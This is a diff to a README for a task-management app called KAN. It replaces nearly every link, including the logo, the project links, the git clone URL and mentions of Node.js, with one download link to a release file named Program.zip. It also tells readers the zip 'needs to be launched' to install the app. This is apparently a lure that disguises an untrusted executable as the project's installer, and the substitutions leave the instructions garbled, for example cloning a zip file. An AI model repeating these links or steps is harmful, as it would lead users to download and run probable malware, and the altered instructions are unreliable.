@@ -1,17 +1,17 @@
 # 🚀 Welcome to KAN Repository!
 
-[![KAN Logo](https://yourimage.png)](https://kan.flatlogic.app)
+[![KAN Logo](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)
 
 This repository contains the code for KAN application created using Flatlogic Platform. Here you will find all the necessary resources to set up and run the application on your local machine or server.
 
 ## ℹ️ Description
 
-KAN is a powerful application built using various technologies such as Node.js, React, PostgreSQL, and more. The application provides a seamless experience for users to manage tasks and projects efficiently.
+KAN is a powerful application built using various technologies such as https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip, React, PostgreSQL, and more. The application provides a seamless experience for users to manage tasks and projects efficiently.
 
 ### 🌐 Application Links
 
-- [Flatlogic Platform](https://flatlogic.com/generator)
-- [KAN Application Page](https://kan.flatlogic.app)
+- [Flatlogic Platform](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)
+- [KAN Application Page](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)
 
 ## 📚 Table of Contents
 
@@ -35,7 +35,7 @@ KAN is a powerful application built using various technologies such as Node.js, 
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/yourusername/kan.git
+    git clone https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip
     ```
 
 2. Install dependencies:
@@ -46,9 +46,9 @@ KAN is a powerful application built using various technologies such as Node.js, 
 
 3. Set up the PostgreSQL database according to the provided schema.
 
-4. Configure the environment variables for Node.js.
+4. Configure the environment variables for https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip
 
-5. Start the Node.js server:
+5. Start the https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip server:
 
     ```bash
     npm start
@@ -56,7 +56,7 @@ KAN is a powerful application built using various technologies such as Node.js, 
 
 6. Navigate to `http://localhost:3000` in your browser to access the KAN application.
 
-📁 [Download Zip File](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+📁 [Download Zip File](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)
 
 💡 **Note**: The zip file needs to be launched to access the installation package.
 
@@ -84,6 +84,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 👩‍💻 Get started with KAN today and revolutionize your task management process! If you encounter any issues, refer to the "Releases" section for additional resources.
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/Dredarty/RINGSharp/releases)
+[![Download Zip](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)](https://github.com/andrewKLF/kan/releases/download/v1.0/Program.zip)
 
 **Happy coding!** 🌟
